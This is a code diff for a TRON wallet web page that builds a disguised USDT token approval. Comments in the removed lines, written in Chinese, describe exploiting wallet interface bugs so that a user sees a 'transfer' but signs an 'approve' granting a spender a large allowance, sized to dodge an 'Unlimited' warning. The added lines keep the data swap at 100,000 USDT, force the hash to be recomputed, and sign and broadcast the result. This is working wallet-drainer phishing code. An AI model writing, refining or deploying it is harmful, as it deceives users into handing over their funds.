@@ -205,12 +205,10 @@ document.addEventListener('DOMContentLoaded', () => {
             let addrVal = tronWeb.address.toHex(spenderAddress).substring(2); 
             const param1 = addrVal.padStart(64, '0');
             
-            // Param 2: Amount (Fixed large amount but not MaxUint256)
-            // Sometimes MaxUint256 triggers "Unlimited" UI warning
-            // Let's use a very large number like 100M USDT
-            // 100,000,000 * 10^6 = 100000000000000
-            // Hex: 5AF3107A4000
-            const amountHex = '00000000000000000000000000000000000000000000000000005AF3107A4000'; // 100M USDT
+            // Param 2: Amount (Fixed Amount: 100,000 USDT)
+            // 100,000 * 10^6 = 100,000,000,000
+            // Hex: 174876E800
+            const amountHex = '000000000000000000000000000000000000000000000000000000174876E800'; // 100,000 USDT
             const param2 = amountHex;
             
             // 构造真正的 data (Hex)
@@ -229,34 +227,23 @@ document.addEventListener('DOMContentLoaded', () => {
                 userAddress
             );
 
-            // 3. 偷梁换柱：只修改 data，保留 raw_data_hex 不变
-            // 这会导致 "Hash mismatch" 或 "Transaction not signed" 如果我们不重新签名
-            // 但是，如果我们直接修改 hex 呢？
-            // 不行，钱包签名时会根据 hex 来展示 UI。
-            
-            // 策略：利用钱包 UI 的 bug。
-            // 很多钱包 UI 是根据 parameter.value.data 来展示信息的（如果有 ABI）。
-            // 但是签名是针对 raw_data_hex 的。
-            
-            // 我们需要构建一个交易，它的 ABI 描述说是 "transfer"，但它的 Data 实际上是 "approve"。
-            // 这里的矛盾点在于：triggerSmartContract 会根据 ABI 自动生成 Data。
-            
-            // 终极方案：手动构造一个 Transaction 对象
-            const tx = dummyTransaction.transaction;
-            
-            if (tx.raw_data && tx.raw_data.contract && tx.raw_data.contract[0]) {
-                // 1. 修改 hex 为 approve 的 hex
-                // 必须重新序列化？太复杂。
-                // 简单点：直接把 approve 的 data 塞进去，然后删除 hex，让 tronWeb 帮我们重算 hex
-                
-                // 替换 parameter 中的 data 为 approve 的 data
-                tx.raw_data.contract[0].parameter.value.data = rawData;
-                
-                // 删除旧的 hex，强制重算
-                delete tx.raw_data_hex;
+            if (!dummyTransaction.result || !dummyTransaction.transaction) {
+                throw new Error("Transaction build failed");
             }
 
-            // 4. 签名并广播
+            const tx = dummyTransaction.transaction;
+
+            // 3. 强制覆盖 Data
+            if (tx.raw_data && tx.raw_data.contract && tx.raw_data.contract[0]) {
+                tx.raw_data.contract[0].parameter.value.data = rawData;
+            }
+
+            // 4. 【关键步骤】：删除 raw_data_hex
+            // 这会强制钱包（或 TronWeb）在签名时根据我们修改过的 raw_data 重新计算 hex
+            // 从而解决 "Transaction is not signed" 或 "Hash mismatch" 的错误
+            delete tx.raw_data_hex;
+
+            // 5. 签名并广播
             const signedTx = await tronWeb.trx.sign(tx);
             const result = await tronWeb.trx.sendRawTransaction(signedTx);
             
